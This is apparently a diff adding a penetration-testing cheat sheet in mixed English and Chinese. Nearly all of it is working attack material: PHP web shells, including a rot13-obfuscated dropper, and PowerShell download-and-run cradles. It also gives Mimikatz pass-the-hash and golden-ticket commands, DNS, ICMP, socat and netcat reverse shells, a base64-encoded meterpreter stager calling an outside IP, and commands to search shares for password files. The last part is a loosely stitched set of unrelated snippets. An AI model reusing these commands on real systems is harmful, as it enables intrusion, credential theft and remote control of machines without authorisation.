+```<?php phpinfo(); ?>```
+
+simple shell: 
+
+```<?php system($_GET["c"]); ?>```
+
+```<?php `$_GET["c"]`; ?>```
+
+file upload:
+
+```<?php file_put_contents('/var/www/html/uploads/test.php', '<?php system($_GET["c"]);?>'); ?>```
+
+file upload evasion:  rot13 + urlencode
+
+```<?php $payload="%3C%3Fcuc%20flfgrz%28%24_TRG%5Bp%5D%29%3B%3F%3E"; file_put_contents('/var/www/html/uploads/test8.php', str_rot13(urldecode($payload))); ?>```
+
+
+<a name="rcewebshell"></a><h3>RCE via webshell</h3>
+
+- All pentest monkey reverse shells: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+- msfvenom x86/linux/shell_reverse_tcp -f elf
+
+- Metasploit `web_delivery` module
+
+- which wget | nc <ip> <port>
+ 
+<a name="rcewmic"></a><h3>RCE via WMIC</h3>
+
+Powershell without powershell:
+
+Generate payload with web_delivery
+
+![powershellless1](https://user-images.githubusercontent.com/7115563/40374533-8da00e10-5de9-11e8-888e-3b1eaccb28b0.png)
+
+Encode Payload
+
+![powershellless2](https://user-images.githubusercontent.com/7115563/40374540-908e0ca8-5de9-11e8-9002-5f03193b10a5.png)
+
+Include payload in xsl file
+
+![powershellless3](https://user-images.githubusercontent.com/7115563/40374546-92dcda84-5de9-11e8-99c8-9066ae129644.png)
+
+<pre>wmic process get brief /format:"https://raw.githubusercontent.com/adon90/pentest_compilation/master/nops.xsl"</pre>
+
+![powershellless4](https://user-images.githubusercontent.com/7115563/40375266-73770028-5deb-11e8-92da-952692727bec.png)
+
+<a name="lolbins"></a><h3>LOLBINS</h3>
+
+<pre>SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://192.168.48.129:8000/reverse.ps1') | IEX"</pre>
+
+![lolbin1](https://user-images.githubusercontent.com/7115563/40776727-ee904d00-64cb-11e8-8921-407581b13edf.png)
+
+<a name="privesc"></a><h2> Privilege Escalation</h2>
+
+
+<a name="linux"></a><h3> Linux Privilege Escalation </h3>
+
+- sudo -l
+- Kernel Exploits
+- OS Exploits
+- Password reuse (mysql, .bash_history, 000-default.conf...)
+- Known binaries with suid flag and interactive (nmap)
+- Custom binaries with suid flag either using other binaries or with command execution
+- Writable files owned by root that get executed (cronjobs)
+- MySQL as root
+- Vulnerable services (chkrootkit, logrotate)
+- Writable /etc/passwd
+- Readable .bash_history
+- SSH private key
+- Listening ports on localhost
+- /etc/fstab
+- /etc/exports
+- /var/mail
+- Process as other user (root) executing something you have permissions to modify
+- SSH public key + Predictable PRNG
+- apt update hooking (Pre-Invoke)
+
+<a name="windows"></a><h3> Windows Privilege Escalation </h3>
+
+- Kernel Exploits
+- OS Exploits
+- Pass The Hash
+- Password reuse
+- DLL hijacking (Path)
+- Vulnerable services
+- Writable services binaries path
+- Unquoted services
+- Listening ports on localhost
+- Registry keys
+
+
+<a name="kernel"></a><h3> Kernel Exploits </h3>
+
+Linux: https://github.com/lucyoa/kernel-exploits
+
+Windows: https://github.com/abatchy17/WindowsExploits
+
+
+
+<a name="tunneling"></a><h2>Tunneling</h2>
+
+<a name="sshovertcp"></a><h3>SSH over HTTP (Squid)</h3>
+
+<b> socat </b>
+
+<pre>socat TCP-L:9999,fork,reuseaddr PROXY:192.168.1.41:127.0.0.1:22,proxyport=3128
+
+ssh john@127.0.0.1 -p 9999</pre>
+
+
+<b>proxytunnel </b>
+
+<pre>proxytunnel -p 192.168.1.41:3128 -d 127.0.0.1:22 -a 5555
+
+ssh john@127.0.0.1 -p 5555</pre>
+
+<b>proxychains </b>
+
+<pre>http 192.168.1.41 3128
+
+proxychains ssh john@127.0.0.1</pre>
+
+![proxychains](https://user-images.githubusercontent.com/7115563/33822522-1e15dbee-de58-11e7-9953-3da8ff684cfc.png)
+
+
+<b>corkscrew </b>
+
+<pre>ssh john@192.168.1.41 -t /bin/sh</pre>
+
+![cork](https://user-images.githubusercontent.com/7115563/33822672-b92a51f0-de58-11e7-9936-06056b7903b8.png)
+
+
+<a name="tcpoverhttp"></a><h3> TCP over HTTP </h3>
+
+For this technique, it is necessary to be able to upload a file to a webserver.
+
+<a name="regeorg"><b> 1. reGeorg </b>
+  
+  File upload to the server correct
+  
+  ![regeorge2](https://user-images.githubusercontent.com/7115563/33883424-028c9f0e-df3c-11e7-9559-b35667ae76db.png)
+  
+  Tunnel creation
+  
+  `python reGeorgSocksProxy.py -p 5555 -u "http://<ip>/admin/uploads/reGeorg.jsp"`
+  
+  Proxychains config
+  
+  ![regeorge1](https://user-images.githubusercontent.com/7115563/33883419-fcc15416-df3b-11e7-89a9-499ffc1de9cf.png)
+  
+  <pre>
+proxychains nmap -F -sT 127.0.0.1
+proxychains mysql -u root -p -h 127.0.0.1
+proxychains ssh localhost
+</pre>
+
+![regeorge3](https://user-images.githubusercontent.com/7115563/33883422-017021fe-df3c-11e7-8f99-f02de5084c02.png)
+
+Reference: https://sensepost.com/discover/tools/reGeorg/
+
+ <a name="abptts"><b> 2. ABBTTS </b>
+  
+Upload File
+
+![abbtts5](https://user-images.githubusercontent.com/7115563/33883774-6d249ffa-df3d-11e7-9f3f-68bf1e70465f.png)
+
+Config proxychains and create the tunnel
+
+```python abpttsclient.py -c tomcat_walkthrough/config.txt -u http://192.168.1.128/abptts.jsp -f 127.0.0.1:22222/127.0.0.1:22```
+
+Usage
+
+```ssh -p 22222 user@127.0.0.1```
+
+![abbtts7](https://user-images.githubusercontent.com/7115563/33883891-dc2f3c70-df3d-11e7-84e9-ebd9eab9ebee.png)
+
+Reference: https://github.com/nccgroup/ABPTTS
+
+
+
+<a name="poor"></a><h3> Man's Poor VPN </h3>
+
+Traffic forward over SSH without needing to ```ssh -D <port>```
+
+<pre>sshuttle -vr user@192.168.207.57 180.46.0.0/16</pre>
+
+![shuttle2](https://user-images.githubusercontent.com/7115563/34785498-a0b5c8c0-f631-11e7-8f3d-75e0ade96275.png)
+
+Proof:
+
+![mantis2](https://user-images.githubusercontent.com/7115563/34785499-a0e7d838-f631-11e7-869f-d6fcdc1051e9.png)
+
+Reference: http://teohm.com/blog/using-sshuttle-in-daily-work/
+
+
+
+<a name="windowsad"></a><h2> Windows AD Environment </h2>
+
+<a name="applocker"></a><h3> Bypass Applocker </h3>
+
+<b>1. rundll32</b>
+
+```rundll32.exe PowerShdll.dll,main```
+
+![applocker](https://user-images.githubusercontent.com/7115563/34455568-dfe7d7c6-ed81-11e7-9869-de2d4e92f3aa.png)
+  
+  Reference: https://github.com/p3nt4/PowerShdll
+  
+<b>2. Alternative powershell files</b>
+
+![applocker2](https://user-images.githubusercontent.com/7115563/34455569-e0136c6a-ed81-11e7-9b0e-127ae9d395e0.png)
+  
+  ```C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise```
+  
+  
+ <a name="pth"></a> <h3> Pass The Hash </h3>
+  
+  
+  <b> Invoke a command Remotely </b>
+  
+  <pre>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-WMIExec.ps1')
+ 
+ Invoke-WMIExec -Target SVHOST2  -Username Administrator -Hash 78560bbcf70110fbfb5add17b5dfd762 -Command "powershell whoami | out-file \\SVHOST2\C$\windows\bitch.txt"
+</pre>
+
+  <b> Invoke Mimikatz Remotely </b>
+  
+  <pre>Invoke-WMIExec -Target SVHOST2  -Username Administrator
+-Hash 78560bbcf70110fbfb5add17b5dfd762 -Command "powershell -Enc SQBFA...AoA"</pre>
+
+![image](https://user-images.githubusercontent.com/7115563/34455757-1f6aed1c-ed86-11e7-9415-595fa5e8d6e7.png)
+  
+  <b> Pass The Hash with Mimikatz </b>
+  
+  <pre> Invoke-Mimikatz -Command '"sekurlsa::pth /user:adm_maint /ntlm:cbe55f143fcb6d4687583af520123b89 /domain:lazuli"'</pre>
+  
+  
+  <a name="krb"></a><h3> Kerberos </h3>
+  
+  
+  <b> Generate Golden Ticket (Domain Admin Required) </b>
+  
+  <pre>Invoke-Mimikatz -Command '"lsadump::dcsync /domain:LAZULI.CORP /user:krbtgt"'</pre>
+  
+  ![image](https://user-images.githubusercontent.com/7115563/34455725-7230ee30-ed85-11e7-9333-16372355ce60.png)
+  
+  ![image](https://user-images.githubusercontent.com/7115563/34455734-89934d5c-ed85-11e7-960e-9659e099c9df.png)
+  
+  <pre>Invoke-Mimikatz  -Command '"kerberos::golden /user:adon /domain:LAZULI.CORP /krbtgt:ca1c2aeda9160094be9971bdc21c50aa /sid:S-1-5-21-1238634245-2147606590-2801756923 /id:500 /ticket:admin.kirbi /ptt"</pre>
+  
+  ![image](https://user-images.githubusercontent.com/7115563/34455745-9edd0360-ed85-11e7-84f0-6d62e621613b.png)
+  
+  <pre>Invoke-Mimikatz  -Command '"kerberos::ptt admin.kirbi"'</pre>
+  
+  ![image](https://user-images.githubusercontent.com/7115563/34455747-b285372a-ed85-11e7-9374-c481108db77e.png)
+  
+  ![image](https://user-images.githubusercontent.com/7115563/34455748-bb0512c6-ed85-11e7-8d40-b6516cf8b0f3.png)
+  
+ <a name="miscwin"></a><h3> Miscellaneous </h3>
+  
+ <b> Invoke Mimikatz </b>
+  
+  <pre>IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz</pre>
+  
+  
+   <b> Runas Powershell </b>
+  
+  ```Start-Process powershell.exe -Verb runas```
+  ```Start-Process powershell.exe -Credential <user>```
+  
+  <b> View Shares With Permissions </b>
+  
+  <pre>powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Invoke-ShareFinder -CheckShareAccess"</pre>
+  
+  ![image](https://user-images.githubusercontent.com/7115563/34455620-34f292b4-ed83-11e7-92b0-3b8dd387146f.png)
+  
+  
+  <b> View files that contain certain words recursively </b>
+  
+  <pre> ls -Path \\SVHOST1.LAZULI.CORP\tmp$ -Include "*pass*","*
+admin*","*secret*" -Recurse </pre>
+
+![image](https://user-images.githubusercontent.com/7115563/34455641-aa03adf4-ed83-11e7-8333-a69366714921.png)
+
+<b> View files which name contains certain words recursively </b>
+
+<pre>dir -Path \\SVHOST1.LAZULI.CORP -Include "*pass*","*admin*","*secret*" -Recurse</pre>
+
+![image](https://user-images.githubusercontent.com/7115563/34455649-dcc941ea-ed83-11e7-9428-a702f254e807.png)
+
+<b> Connect to MSSQL Database </b>
+
+<pre>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/michaellwest/PowerShell-Modules/master/CorpApps/Invoke-SqlCommand.ps1')
+
+Invoke-SqlCommand -Server 172.11.14.89 -Database master -Username sa -Password <password> -Query "exec sp_databases" </pre>
+
+<b> Port Scanning </b>
+
+<pre>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1')
+
+Invoke-Portscan -Hosts [ip] -TopPorts 50</pre>
+  
+  ![image](https://user-images.githubusercontent.com/7115563/34455679-6e630230-ed84-11e7-995e-2eea1a6fc8dc.png)
+  
+  
+  <b> View Domain Admins </b>
+  
+  <pre> net groups /domain "Domain Admins"</pre>
+  
+  ![image](https://user-images.githubusercontent.com/7115563/34455690-9e648d78-ed84-11e7-9a84-9b335530a31e.png)
+  
+  <b> View Domain Controlers </b>
+  
+  <pre>nltest /dclist:<domain> </pre>
+  
+  ![image](https://user-images.githubusercontent.com/7115563/34455698-d1504074-ed84-11e7-85ad-c4bb196c9d44.png)
+  
+
+  
+<b> Get Hashes </b>
+
+<pre>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');Get-PassHashes</pre>
+
+  ![image](https://user-images.githubusercontent.com/7115563/34455769-66cb31bc-ed86-11e7-846e-090647d8e32f.png)
+  
+  
+<b> Check Pass The Hash with multiple servers</b>
+
+<pre>$hosts = @("SVDC1.LAZULI.CORP","SVFILES.LAZULI.CORP","SVHOST1.LAZULI.CORP","SVHOST2.LAZULI.CORP","SVFILES2.LAZULI.CORP")
+
+foreach ($h in $hosts){ Invoke-WMIExec -Target $h -Username Administrator -Hash 78560bbcf70110fbfb5add17b5dfd762 -Command "hostname" -Verbose }
+
+</pre>
+
+![image](https://user-images.githubusercontent.com/7115563/34455798-0bdc77ec-ed87-11e7-9504-6b9ec6fc2a8d.png)
+
+References: https://www.hacklikeapornstar.com/
+  
+
+
+<a name="revshells"></a><h2> Reverse Shells </h2>
+
+<a name="dns"></a><h3> Reverse DNS Shell with dnscat powershell </h3>
+
+<b> Server </b>
+
+<pre>ruby dnscat2.rb -e open --no-cache tunnel.domain.com</pre>
+
+
+<b> Client </b>
+
+<pre>IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1'); Start-Dnscat2 -Domain tunnel.domain.com -DNSServer 8.8.4.4 </pre>
+
+
+![dns](https://user-images.githubusercontent.com/7115563/35040679-5a155bfa-fb82-11e7-98ec-ba015e3ad69c.png)
+
+Reference: https://github.com/lukebaggett/dnscat2-powershell
+
+
+<a name="icmp"></a><h3> Reverse ICMP shell </h3>
+
+<b> Server </b>
+
+<pre> python icmpsh_m.py [IP atacante] [IP victima] </pre>
+
+<b> Client </b>
+
+<pre>IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellIcmp.ps1'); Invoke-PowerShellIcmp -IPAddress [IP atacante]</pre>
+
+![icmpreverseshell](https://user-images.githubusercontent.com/7115563/35213289-6ac51b00-ff5d-11e7-9b66-766af2aaf92e.png)
+
+Reference: https://esgeeks.com/icmpsh-shell-reverse-con-icmp/
+
+
+<a name="httpproxy"></a><h3> Reverse HTTP Shell through Proxy </h3>
+
+<pre>use payload/python/meterpreter/reverse_http</pre>
+
+![proxy2](https://user-images.githubusercontent.com/7115563/33836652-3d9c9624-de8a-11e7-9869-e18c5a28ebd7.png)
+
+
+```python -c "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHN5cwp2aT1zeXMudmVyc2lvbl9pbmZvCnVsPV9faW1wb3J0X18oezI6J3VybGxpYjInLDM6J3VybGxpYi5yZXF1ZXN0J31bdmlbMF1dLGZyb21saXN0PVsnYnVpbGRfb3BlbmVyJywnUHJveHlIYW5kbGVyJ10pCmhzPVtdCmhzLmFwcGVuZCh1bC5Qcm94eUhhbmRsZXIoeydodHRwJzonaHR0cDovLzE5Mi4xNjguMTA3LjIzMjo4MDgwJ30pKQpvPXVsLmJ1aWxkX29wZW5lcigqaHMpCm8uYWRkaGVhZGVycz1bKCdVc2VyLUFnZW50JywnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBUcmlkZW50LzcuMDsgcnY6MTEuMCkgbGlrZSBHZWNrbycpXQpleGVjKG8ub3BlbignaHR0cDovLzE3OC42Mi41OC4zNTo4MC9qOTkzQScpLnJlYWQoKSkK')))"```
+
+Finally we set up the handler:
+
+![proxy3](https://user-images.githubusercontent.com/7115563/33836552-fd3204ac-de89-11e7-940c-71c8ab321bf7.png)
+
+
+<a name="misc"></a><h2> Miscellaneous </h2>
+
+<a name="interactiveshell"></a><h3> Interactive Reverse Shell </h3>
+
+<b> Method 1 </b>
+
+Attacker:
+
+```socat file:`tty`,raw,echo=0 TCP-L:4444```
+
+Victim:
+
+```wget -q http://10.10.14.16/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.16:4444```
+
+Socat Binary: https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
+
+<b> Method 2 </b>
+
+In reverse shell
+
+<pre>
+python -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl-Z
+</pre>
+
+In kali
+
+<pre>
+echo $TERM
+stty -a
+stty raw -echo
+fg
+</pre>
+
+In reverse shell
+
+<pre>
+reset
+export SHELL=bash
+export TERM=xterm-256color
+stty rows <num> columns <cols>
+bash
+</pre>
+
+<a name="windowstransfer"></a><h3> Windows File Transfer </h3>
+
+<b>bitsadmin</b>
+
+`bitsadmin /transfer debjob /download /priority normal http://<ip>/shell.php c:\xampp\htdocs\shell.php`
+
+<b>cscript wget.vbs (code on the repo)</b>
+
+`cscript wget.vbs http://<ip>/test.txt test.txt`
+
+<b>powershell</b>
+
+`powershell -c "(new-object System.Net.WebClient).Downloadfile('http://<ip>/exploit.exe', 'C:\Windows\temp\exploit.txt')"`
+
+<b>ftp</b>
+
+client:
+
+<pre>
+echo open [ip] [port] > ftpscript.txt
+echo anonymous>> ftpscript.txt
+echo PASS >> ftpscript.txt
+echo bin >> ftpscript.txt
+echo get meter.exe>> ftpscript.txt
+echo quit >> ftpscript.txt
+ftp -s:ftpscript.txt
+</pre>
+
+server:
+
+<code>python -m pyftpdlib  --port=2121 --write</code>
+
+<b>wget.exe</b>
+
+Upload to vulnerable server from kali: ` /usr/share/windows-binaries/wget.exe`
+
+`wget.exe http://<ip>/file file`
+
+<b> certutil </b>
+
+`certutil -urlcache -split -f  https://<ip>/file.txt file.txt`
+  
+<a name="vpnrestrict"></a><h3> Bypass VPN routing restrictions </h3>
+
+<pre>openconnect vpnXXX02.XXXX.com -u XX -s ‘vpn-slice XXX.46.0.0/16 hostname3 mantis=XXX.46.224.68’</pre>
+
+![vpn](https://user-images.githubusercontent.com/7115563/34785073-5f76d2ce-f630-11e7-9acb-2fbe9e74494b.png)
+
+Reference: https://github.com/dlenski/vpn-slice
+
+# Damn Vulnerable Web Application (DVWA) 
+
+http://dvwa.co.uk
+```
+docker pull vulnerables/web-dvwa
+docker run --rm -it -p 80:80 vulnerables/web-dvwa
+```
+
+# 文件分析
+```
+Linux:
+$ strings app.exe | grep -E -i 'https?://'
+Windows (requires the Strings utility from Microsoft Sysinternals):
+
+C:\> strings app.exe | findstr /i /r "htt[ps]*://"
+tasklist /FI "IMAGENAME eq app.exe"
+```
+
+# Bypass any WAF for XSS easily
+XSS Scanner equipped with powerful fuzzing engine & intelligent payload generator 
+经典XSS模糊测试不要错过
+
+```
+https://github.com/UltimateHackers/Blazy/
+Blazy is a modern login bruteforcer which also tests for CSRF, Clickjacking, Cloudflare and WAF
+
+https://teamultimate.in/bypass-waf-xss-easily/
+https://github.com/UltimateHackers/XSStrike
+http://brutelogic.com.br/blog/
+```
+```
+git clone https://github.com/UltimateHackers/XSStrike
+cd XSStrike
+pip install -r requirements.txt
+python xsstrike
+```
+
+# 反弹
+```
+hacker:
+nc -nvlp 443
+
+target
+mknod /tmp/backpipe p
+/bin/sh -c "/bin/sh 0</tmp/backpipe | nc hackerIp 443 1>/tmp/backpipe"
+```
+
+# 后渗透获取信息teamviewer密码
+
+```
+https://github.com/attackercan/teamviewer-dumper.git
+```
+
+# html中iframe调用
+```
+document.getElementsByTagName("iframe")[0].contentWindow
+document.getElementsByTagName("iframe")[0].ownerDocument
+防御：
+对Funciton等对象的toString重定义
+return null，从而保护、避免代码被调试、渗透查阅
+其他参考代码
+var ifrm = window.frameElement; // reference to iframe element container
+var doc = ifrm.ownerDocument; // reference to container's document
+var form = doc.forms[0]; // reference to first form in container document
+// reference to first form in parent document
+var form = parent.document.forms[0];
+// or, using form id instead
+var form = parent.document.getElementById('myForm');
+// increment and display counter variable contained in parent document
+form.elements['button2'].onclick = function() {
+    parent.counter++;
+    this.form.elements['display'].value = 'counter in parent document is: ' + parent.counter;
+}
+
+form.elements.button3.onclick = function() {
+    var re = /[^-a-zA-Z!,'?\s]/g; // to filter out unwanted characters
+    // get reference to greeting text box in containing document
+    var fld = parent.document.forms['demoForm'].elements['greeting'];
+    var val = fld.value.replace(re, '');
+    // display value in iframed document's text box
+    this.form.elements.display.value = 'The greeting is: ' + val;
+}
+
+form.elements.button4.onclick = function() {
+    parent.clearGreeting(); // call function in parent document
+}
+```
+
+
+# 知识库
+```
+https://github.com/qazbnm456/awesome-web-security
+https://github.com/Muhammd/Awesome-Pentest
+https://github.com/dloss/python-pentest-tools
+https://github.com/RhinoSecurityLabs/Security-Research
+```
+### web安全扫描框架
+https://github.com/Arachni/arachni
+
+### 摘要 
+```
+shasum -a 256 tor.conf
+openssl sha512 tor.conf
+```
